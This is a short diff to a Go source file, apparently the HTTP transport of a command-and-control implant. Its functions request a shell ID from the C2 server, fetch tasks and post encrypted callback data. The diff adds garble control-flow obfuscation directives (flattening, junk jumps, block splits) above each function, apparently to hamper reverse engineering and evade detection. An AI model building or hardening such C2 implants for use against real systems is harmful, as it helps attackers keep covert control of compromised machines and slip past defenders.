@@ -59,6 +59,7 @@ Fetch ShellId from C2
 There likely is areas to improve in this function.
 The bootstrapping problem is in effect here.
 */
+//garble:controlflow flatten_passes=1 junk_jumps=3 block_splits=0
 func (hl *HttpLink) NewShellIdRequest() (*http.Request, error) {
 	// Parse host URL
 	url, err := url.Parse(hl.Host)
@@ -79,6 +80,7 @@ func (hl *HttpLink) NewShellIdRequest() (*http.Request, error) {
 Fetch tasks from C2
 Will respond with json marshalled list of tasks
 */
+//garble:controlflow flatten_passes=2 junk_jumps=1 block_splits=1
 func (hl *HttpLink) NewTasksRequest() (*http.Request, error) {
 	// Parse host URL
 	url, err := url.Parse(hl.Host)
@@ -101,6 +103,7 @@ func (hl *HttpLink) NewTasksRequest() (*http.Request, error) {
 Call back to C2
 Expects encrypted call back data
 */
+//garble:controlflow flatten_passes=1 junk_jumps=3 block_splits=0
 func (hl *HttpLink) NewCallBackRequest(data []byte) (*http.Request, error) {
 	// Parse host URL
 	url, err := url.Parse(hl.Host)
@@ -124,6 +127,7 @@ func (hl *HttpLink) NewCallBackRequest(data []byte) (*http.Request, error) {
 /*
 Send Http request over link
 */
+//garble:controlflow flatten_passes=1 junk_jumps=3 block_splits=0
 func (hl *HttpLink) SendRequest(req *http.Request) (*http.Response, error) {
 	// Set User-Agent header
 	req.Header.Set("User-Agent", userAgent)
